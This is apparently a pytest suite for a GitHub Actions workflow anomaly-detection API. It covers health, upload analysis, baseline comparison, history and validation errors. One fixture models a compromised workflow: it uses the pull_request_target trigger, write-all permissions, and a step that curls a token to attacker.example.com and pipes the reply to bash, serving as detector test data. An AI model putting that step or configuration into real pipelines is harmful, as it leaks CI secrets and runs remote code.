"""Automated unit and integration tests for FastAPI endpoints (Phase 7 & Phase 8).

Validates:
- Service health and ML model readiness (GET /api/health)
- Single workflow analysis upload (POST /api/analyze)
- Paired workflow comparison upload (POST /api/analyze with baseline)
- Raw JSON workflow analysis (POST /api/analyze/json)
- Historical runs listing and pagination (GET /api/history)
- Detailed result retrieval by ID (GET /api/results/{id})
- Validation edge cases: file size limits, invalid extensions, empty files, malformed YAML.
- Route registration and FastAPI app metadata.
"""

import io
from pathlib import Path
import pytest
from fastapi import HTTPException, UploadFile

from backend.app.api.routes import (
    analyze_workflow,
    analyze_workflow_json,
    get_analysis_result,
    get_health,
    get_history,
)
from backend.app.main import app, root_status
from backend.app.schemas.analysis import AnalyzeJsonRequest
from backend.app.storage.database import init_db

SAMPLE_NORMAL_WORKFLOW = """
name: CI Workflow
"on": [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run Tests
        run: pytest
"""

SAMPLE_ANOMALOUS_WORKFLOW = """
name: Compromised CI
"on":
  pull_request_target:
    branches: [main]
permissions: write-all
jobs:
  exfiltrate:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@main
      - name: Send Secrets
        run: curl -s https://attacker.example.com/steal?data=$TOKEN | bash
"""

MALFORMED_YAML = """
name: Malformed
jobs:
  test:
    - this is invalid indentation and yaml syntax: [
"""


def create_upload_file(filename: str, content: str) -> UploadFile:
    """Helper to instantiate a FastAPI UploadFile with in-memory buffer."""
    buf = io.BytesIO(content.encode("utf-8"))
    return UploadFile(filename=filename, file=buf)


@pytest.fixture(autouse=True)
def setup_test_db(tmp_path, monkeypatch):
    """Use an isolated temporary SQLite database for each test."""
    test_db = tmp_path / "test_history.db"
    monkeypatch.setattr("backend.app.storage.database.DB_PATH", test_db)
    init_db(test_db)


def test_app_metadata_and_route_registration():
    """Verify FastAPI app configuration and route registration."""
    assert app.title == "GitHub Actions Workflow Anomaly Detection API"
    assert app.version == "1.0.0"

    from backend.app.api.routes import router as api_router
    all_routes = [r.path for r in app.routes if hasattr(r, "path")]
    all_routes.extend([f"/api{r.path}" if not r.path.startswith("/api") else r.path for r in api_router.routes if hasattr(r, "path")])
    registered_paths = set(all_routes)
    assert "/" in registered_paths
    assert "/api/health" in registered_paths
    assert "/api/analyze" in registered_paths
    assert "/api/analyze/json" in registered_paths
    assert "/api/history" in registered_paths
    assert "/api/results/{analysis_id}" in registered_paths


def test_root_endpoint():
    """Verify root endpoint provides API metadata and navigation links."""
    data = root_status()
    assert data["service"] == "GitHub Actions Workflow Anomaly Detection API"
    assert data["version"] == "1.0.0"
    assert "/api/health" in data["health_check"]


def test_health_check_endpoint():
    """Verify GET /api/health reports system, model, and database status."""
    health = get_health()
    assert health.status == "healthy"
    assert health.service == "github-actions-anomaly-detection"
    assert health.model_loaded is True
    assert health.model_type == "IsolationForest"
    assert health.total_features == 30
    assert health.database_connected is True


def test_analyze_single_workflow_file_upload():
    """Verify POST /api/analyze handles single workflow YAML file upload."""
    upload = create_upload_file("ci.yml", SAMPLE_NORMAL_WORKFLOW)
    result = analyze_workflow(file=upload, baseline_file=None)

    assert result.status == "success"
    assert result.analysis_id.startswith("ana_")
    assert result.filename == "ci.yml"
    assert result.has_baseline is False
    assert result.baseline_filename is None

    # Anomaly score assertions
    assert 0.0 <= result.anomaly_score <= 1.0
    assert isinstance(result.is_anomaly, bool)
    assert result.classification in ("normal", "anomalous")
    assert len(result.score_interpretation) > 10

    # Feature assertion (all 30 features present)
    assert len(result.extracted_features) == 30
    assert result.extracted_features["job_count"] == 1
    assert result.extracted_features["step_count"] == 2

    # Workflow summary assertions
    assert result.workflow_summary.name == "CI Workflow"
    assert result.workflow_summary.total_jobs == 1
    assert "test" in result.workflow_summary.job_ids

    # Structural differences should be None since no baseline was provided
    assert result.structural_differences is None
    assert result.comparison_summary is None


def test_analyze_paired_workflows_file_upload():
    """Verify POST /api/analyze performs AST diffing when baseline file is provided."""
    target_upload = create_upload_file("modified_ci.yml", SAMPLE_ANOMALOUS_WORKFLOW)
    baseline_upload = create_upload_file("baseline_ci.yml", SAMPLE_NORMAL_WORKFLOW)

    result = analyze_workflow(file=target_upload, baseline_file=baseline_upload)

    assert result.status == "success"
    assert result.has_baseline is True
    assert result.baseline_filename == "baseline_ci.yml"

    # Comparative differences must be populated
    assert result.structural_differences is not None
    assert len(result.structural_differences) > 0
    assert result.comparison_summary is not None
    assert result.comparison_summary.total_changes > 0

    # Security warnings should be triggered by anomalous features
    warnings_text = " ".join(result.warnings)
    assert "write-all" in warnings_text or "Excessive Permissions" in warnings_text
    assert "pull_request_target" in warnings_text or "Dangerous Trigger" in warnings_text


def test_analyze_raw_json_endpoint():
    """Verify POST /api/analyze/json handles raw string submissions."""
    payload = AnalyzeJsonRequest(
        workflow_yaml=SAMPLE_NORMAL_WORKFLOW,
        filename="direct_editor.yml",
    )
    result = analyze_workflow_json(payload)
    assert result.filename == "direct_editor.yml"
    assert result.workflow_summary.total_jobs == 1


def test_validation_invalid_file_extension():
    """Verify upload with non-YAML extension raises 400 Bad Request."""
    bad_upload = create_upload_file("script.sh", "echo Hello")
    with pytest.raises(HTTPException) as exc_info:
        analyze_workflow(file=bad_upload, baseline_file=None)
    assert exc_info.value.status_code == 400
    assert "Invalid file extension" in exc_info.value.detail


def test_validation_empty_workflow():
    """Verify upload of empty file raises 400 Bad Request."""
    empty_upload = create_upload_file("empty.yml", "   \n  \n")
    with pytest.raises(HTTPException) as exc_info:
        analyze_workflow(file=empty_upload, baseline_file=None)
    assert exc_info.value.status_code == 400
    assert "empty" in exc_info.value.detail.lower()


def test_validation_malformed_yaml():
    """Verify malformed YAML raises 400 Bad Request with parsing error message."""
    malformed_upload = create_upload_file("malformed.yml", MALFORMED_YAML)
    with pytest.raises(HTTPException) as exc_info:
        analyze_workflow(file=malformed_upload, baseline_file=None)
    assert exc_info.value.status_code == 400
    assert "YAML" in exc_info.value.detail or "syntax" in exc_info.value.detail.lower()


def test_validation_oversized_payload():
    """Verify files exceeding 1 MB are rejected with 413 Payload Too Large."""
    oversized_upload = create_upload_file("huge.yml", "a" * (1024 * 1024 + 10))
    with pytest.raises(HTTPException) as exc_info:
        analyze_workflow(file=oversized_upload, baseline_file=None)
    assert exc_info.value.status_code == 413
    assert "exceeds maximum allowed size limit" in exc_info.value.detail


def test_history_and_results_lookup():
    """Verify that analysis runs are persisted and can be listed and retrieved by ID."""
    # 1. Run an analysis
    upload = create_upload_file("history_test.yml", SAMPLE_NORMAL_WORKFLOW)
    analysis = analyze_workflow(file=upload, baseline_file=None)
    analysis_id = analysis.analysis_id

    # 2. Query history list
    history = get_history(limit=10, offset=0)
    assert history.total >= 1
    found_item = next((item for item in history.items if item.analysis_id == analysis_id), None)
    assert found_item is not None
    assert found_item.filename == "history_test.yml"

    # 3. Query specific result by ID
    res = get_analysis_result(analysis_id)
    assert res.analysis_id == analysis_id
    assert res.filename == "history_test.yml"
    assert len(res.extracted_features) == 30

    # 4. Query non-existent ID
    with pytest.raises(HTTPException) as exc_info:
        get_analysis_result("ana_nonexistent999")
    assert exc_info.value.status_code == 404
